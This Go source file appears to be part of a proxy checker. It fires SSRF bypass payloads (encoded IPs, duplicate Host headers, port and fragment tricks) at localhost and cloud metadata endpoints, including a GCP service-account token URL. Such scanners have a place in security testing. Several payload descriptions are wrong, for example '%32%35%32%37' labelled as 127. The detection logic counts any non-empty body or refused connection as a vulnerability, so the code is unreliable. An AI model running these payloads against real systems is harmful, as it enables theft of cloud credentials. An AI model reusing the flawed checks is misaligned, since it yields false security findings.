package proxy

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// testEncodingBypass tests for URL encoding bypass vulnerabilities
// Tests double encoding, Unicode, overlong UTF-8, and mixed encoding schemes
func (c *Checker) testEncodingBypass(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[ENCODING BYPASS] Testing URL encoding bypass vulnerabilities\n"
	}

	vulnerable := false
	bypassDetails := []string{}

	// Encoding bypass test cases targeting localhost and AWS metadata
	encodingTests := []struct {
		url         string
		target      string
		description string
	}{
		// Double encoding bypasses
		{
			url:         "http://%32%35%32%37.0.0.1/",
			target:      "127.0.0.1",
			description: "Double URL encoding of 127.0.0.1",
		},
		{
			url:         "http://169.254.%32%35%34.%32%35%34/",
			target:      "169.254.169.254",
			description: "Partial double encoding of AWS metadata IP",
		},

		// Unicode encoding
		{
			url:         "http://\u0031\u0032\u0037.0.0.1/",
			target:      "127.0.0.1",
			description: "Unicode-encoded localhost (\\u escapes)",
		},
		{
			url:         "http://\u0031\u0036\u0039.254.169.254/",
			target:      "169.254.169.254",
			description: "Unicode-encoded AWS metadata IP",
		},

		// Overlong UTF-8 encoding (2-byte for ASCII characters)
		{
			url:         "http://%c0%a7%c0%a7.0.0.1/",
			target:      "127.0.0.1",
			description: "Overlong UTF-8 encoding (2-byte for '1' and '2')",
		},
		{
			url:         "http://169.254.%c0%a9%c0%a9/",
			target:      "169.254.169.254",
			description: "Overlong UTF-8 for AWS metadata octets",
		},

		// Mixed encoding schemes
		{
			url:         "http://127.%30.%30.1/",
			target:      "127.0.0.1",
			description: "Mixed hex encoding of octets",
		},
		{
			url:         "http://0x7f.0.0.1/",
			target:      "127.0.0.1",
			description: "Hex first octet (0x7f = 127)",
		},
		{
			url:         "http://0177.0.0.1/",
			target:      "127.0.0.1",
			description: "Octal first octet (0177 = 127)",
		},

		// Null byte injection
		{
			url:         "http://allowed.com%00.127.0.0.1/",
			target:      "127.0.0.1",
			description: "Null byte truncation attack",
		},

		// Case variation with encoding
		{
			url:         "http://LocalHost/",
			target:      "127.0.0.1",
			description: "Case variation of localhost",
		},
		{
			url:         "http://LOCALHOST/",
			target:      "127.0.0.1",
			description: "Uppercase localhost",
		},
	}

	for _, test := range encodingTests {
		if c.debug {
			result.DebugInfo += fmt.Sprintf("  Testing: %s\n", test.description)
		}

		req, err := http.NewRequest("GET", test.url, nil)
		if err != nil {
			continue
		}

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		req = req.WithContext(ctx)

		resp, err := client.Do(req)
		cancel()

		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// Check for successful connection to internal target
			if resp.StatusCode == 200 || resp.StatusCode == 301 || resp.StatusCode == 302 {
				if strings.Contains(bodyStr, "localhost") ||
					strings.Contains(bodyStr, "ami-id") ||
					strings.Contains(bodyStr, "instance-id") ||
					strings.Contains(bodyStr, "metadata") ||
					len(bodyStr) > 0 {

					vulnerable = true
					bypassDetails = append(bypassDetails, fmt.Sprintf("%s (target: %s)", test.description, test.target))

					if c.debug {
						result.DebugInfo += fmt.Sprintf("  [VULN] Encoding bypass successful: %s\n", test.description)
					}
				}
			}
		} else {
			// Connection error might indicate successful bypass attempt
			if strings.Contains(err.Error(), "connection refused") ||
				strings.Contains(err.Error(), "no route to host") {

				vulnerable = true
				bypassDetails = append(bypassDetails, fmt.Sprintf("%s (connection attempt detected)", test.description))

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Encoding bypass connection attempt: %s\n", test.description)
				}
			}
		}
	}

	return vulnerable, bypassDetails
}

// testMultipleHostHeaders tests for multiple/duplicate Host header handling
// HTTP/1.1 allows multiple Host headers - tests which one wins (front-end vs back-end)
func (c *Checker) testMultipleHostHeaders(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[MULTIPLE HOST HEADERS] Testing duplicate Host header vulnerabilities\n"
	}

	vulnerable := false
	headerDetails := []string{}

	// Test cases for multiple Host headers
	hostTests := []struct {
		host1       string
		host2       string
		description string
	}{
		{
			host1:       "allowed.com",
			host2:       "127.0.0.1",
			description: "Allowed domain + localhost",
		},
		{
			host1:       "allowed.com",
			host2:       "169.254.169.254",
			description: "Allowed domain + AWS metadata",
		},
		{
			host1:       "allowed.com",
			host2:       "metadata.google.internal",
			description: "Allowed domain + GCP metadata",
		},
		{
			host1:       "169.254.169.254",
			host2:       "allowed.com",
			description: "AWS metadata + allowed domain (reversed)",
		},
		{
			host1:       "localhost",
			host2:       "allowed.com",
			description: "Localhost + allowed domain",
		},
	}

	for _, test := range hostTests {
		if c.debug {
			result.DebugInfo += fmt.Sprintf("  Testing: %s\n", test.description)
		}

		// Create request with custom Transport to allow multiple Host headers
		// Note: Go's http.Client normalizes headers, so we test the proxy's behavior
		req, err := http.NewRequest("GET", "http://"+test.host1+"/", nil)
		if err != nil {
			continue
		}

		// Add second Host header via Header map manipulation
		req.Header.Add("Host", test.host2)

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		req = req.WithContext(ctx)

		resp, err := client.Do(req)
		cancel()

		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// Check if reached internal service
			if strings.Contains(bodyStr, "ami-id") ||
				strings.Contains(bodyStr, "instance-id") ||
				strings.Contains(bodyStr, "metadata") ||
				resp.StatusCode == 200 {

				vulnerable = true
				headerDetails = append(headerDetails, test.description)

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Multiple Host header bypass: %s\n", test.description)
				}
			}
		} else {
			// Connection attempt indicates proxy processed the request
			if strings.Contains(err.Error(), "connection refused") ||
				strings.Contains(err.Error(), "no route to host") {

				vulnerable = true
				headerDetails = append(headerDetails, fmt.Sprintf("%s (connection attempt)", test.description))

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Multiple Host header connection attempt: %s\n", test.description)
				}
			}
		}
	}

	return vulnerable, headerDetails
}

// testCloudHeaders tests for cloud-specific metadata header requirements
// Different cloud providers require specific headers to access metadata services
func (c *Checker) testCloudHeaders(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[CLOUD HEADERS] Testing cloud-specific metadata headers\n"
	}

	vulnerable := false
	cloudDetails := []string{}

	// Cloud provider metadata tests
	cloudTests := []struct {
		url         string
		headers     map[string]string
		description string
		indicators  []string
	}{
		{
			url: "http://metadata.google.internal/computeMetadata/v1/",
			headers: map[string]string{
				"Metadata-Flavor": "Google",
			},
			description: "GCP metadata with Metadata-Flavor header",
			indicators:  []string{"instance", "project", "serviceAccounts"},
		},
		{
			url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
			headers: map[string]string{
				"Metadata": "true",
			},
			description: "Azure metadata with Metadata: true header",
			indicators:  []string{"compute", "network", "vmId"},
		},
		{
			url: "http://169.254.169.254/opc/v1/instance/",
			headers: map[string]string{
				"Authorization": "Bearer Oracle",
			},
			description: "Oracle Cloud metadata",
			indicators:  []string{"ociAdName", "compartmentId"},
		},
		{
			url: "http://100.100.100.200/latest/meta-data/",
			headers: map[string]string{
				"X-Aliyun-Metadata": "1",
			},
			description: "Alibaba Cloud (Aliyun) metadata",
			indicators:  []string{"instance-id", "region-id"},
		},
		{
			url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
			headers: map[string]string{
				"Metadata-Flavor": "Google",
			},
			description: "GCP service account token",
			indicators:  []string{"access_token", "token_type"},
		},
	}

	for _, test := range cloudTests {
		if c.debug {
			result.DebugInfo += fmt.Sprintf("  Testing: %s\n", test.description)
		}

		req, err := http.NewRequest("GET", test.url, nil)
		if err != nil {
			continue
		}

		// Add cloud-specific headers
		for key, value := range test.headers {
			req.Header.Set(key, value)
		}

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		req = req.WithContext(ctx)

		resp, err := client.Do(req)
		cancel()

		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// Check for cloud metadata indicators
			foundIndicator := false
			for _, indicator := range test.indicators {
				if strings.Contains(bodyStr, indicator) {
					foundIndicator = true
					break
				}
			}

			if foundIndicator || (resp.StatusCode == 200 && len(bodyStr) > 0) {
				vulnerable = true
				cloudDetails = append(cloudDetails, test.description)

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Cloud metadata access: %s\n", test.description)
				}
			}
		}
	}

	return vulnerable, cloudDetails
}

// testPortTricks tests for port specification manipulation vulnerabilities
// Tests unusual port specifications that might bypass filters
func (c *Checker) testPortTricks(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[PORT TRICKS] Testing port specification vulnerabilities\n"
	}

	vulnerable := false
	portDetails := []string{}

	// Port manipulation test cases
	portTests := []struct {
		url         string
		description string
	}{
		{
			url:         "http://127.0.0.1:80:22/",
			description: "Double port specification (80:22)",
		},
		{
			url:         "http://169.254.169.254:80:443/",
			description: "AWS metadata with double ports",
		},
		{
			url:         "http://127.0.0.1:0/",
			description: "Port 0 (might default to 80)",
		},
		{
			url:         "http://127.0.0.1:65536/",
			description: "Port overflow (65536 > max)",
		},
		{
			url:         "http://127.0.0.1:-1/",
			description: "Negative port number",
		},
		{
			url:         "http://[::1]:8080:3128/",
			description: "IPv6 with double port",
		},
		{
			url:         "http://user:pass@127.0.0.1:80:22/",
			description: "Auth + double port",
		},
		{
			url:         "http://127.0.0.1:80@evil.com/",
			description: "Port confusion with @ symbol",
		},
	}

	for _, test := range portTests {
		if c.debug {
			result.DebugInfo += fmt.Sprintf("  Testing: %s\n", test.description)
		}

		req, err := http.NewRequest("GET", test.url, nil)
		if err != nil {
			// URL parsing error might itself be interesting
			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [INFO] URL parsing failed: %s\n", test.description)
			}
			continue
		}

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		req = req.WithContext(ctx)

		resp, err := client.Do(req)
		cancel()

		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// Successful connection indicates port trick worked
			if resp.StatusCode == 200 || len(bodyStr) > 0 {
				vulnerable = true
				portDetails = append(portDetails, test.description)

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Port trick bypass: %s\n", test.description)
				}
			}
		} else {
			// Connection attempt to internal host
			if strings.Contains(err.Error(), "connection refused") ||
				strings.Contains(err.Error(), "no route to host") {

				vulnerable = true
				portDetails = append(portDetails, fmt.Sprintf("%s (connection attempt)", test.description))

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Port trick connection attempt: %s\n", test.description)
				}
			}
		}
	}

	return vulnerable, portDetails
}

// testFragmentQuery tests for URL fragment and query manipulation
// Tests how proxies handle fragments, queries, and unusual URL structures
func (c *Checker) testFragmentQuery(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[FRAGMENT/QUERY] Testing fragment and query manipulation\n"
	}

	vulnerable := false
	fragmentDetails := []string{}

	// Fragment and query manipulation tests
	fragmentTests := []struct {
		url         string
		description string
	}{
		{
			url:         "http://allowed.com#@127.0.0.1/",
			description: "Fragment with @ symbol (parser confusion)",
		},
		{
			url:         "http://allowed.com#?@169.254.169.254",
			description: "Fragment + query + @ (AWS metadata)",
		},
		{
			url:         "http://127.0.0.1#foo.allowed.com",
			description: "Localhost with allowed domain in fragment",
		},
		{
			url:         "http://allowed.com?@127.0.0.1/",
			description: "Query with @ symbol",
		},
		{
			url:         "http://allowed.com?url=http://127.0.0.1",
			description: "URL in query parameter",
		},
		{
			url:         "http://allowed.com?redirect=//169.254.169.254",
			description: "Protocol-relative redirect in query",
		},
		{
			url:         "http://allowed.com/../../../127.0.0.1",
			description: "Path traversal to localhost",
		},
		{
			url:         "http://allowed.com/..\\..\\..\\127.0.0.1",
			description: "Windows-style path traversal",
		},
		{
			url:         "http://allowed.com%23@127.0.0.1",
			description: "Encoded fragment character",
		},
		{
			url:         "http://allowed.com%3f@169.254.169.254",
			description: "Encoded query character",
		},
	}

	for _, test := range fragmentTests {
		if c.debug {
			result.DebugInfo += fmt.Sprintf("  Testing: %s\n", test.description)
		}

		req, err := http.NewRequest("GET", test.url, nil)
		if err != nil {
			continue
		}

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		req = req.WithContext(ctx)

		resp, err := client.Do(req)
		cancel()

		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// Check for successful access to internal services
			if strings.Contains(bodyStr, "ami-id") ||
				strings.Contains(bodyStr, "instance-id") ||
				strings.Contains(bodyStr, "metadata") ||
				strings.Contains(bodyStr, "localhost") ||
				(resp.StatusCode == 200 && len(bodyStr) > 0) {

				vulnerable = true
				fragmentDetails = append(fragmentDetails, test.description)

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Fragment/query bypass: %s\n", test.description)
				}
			}
		} else {
			// Connection attempt indicates bypass
			if strings.Contains(err.Error(), "connection refused") ||
				strings.Contains(err.Error(), "no route to host") {

				vulnerable = true
				fragmentDetails = append(fragmentDetails, fmt.Sprintf("%s (connection attempt)", test.description))

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Fragment/query connection attempt: %s\n", test.description)
				}
			}
		}
	}

	return vulnerable, fragmentDetails
}
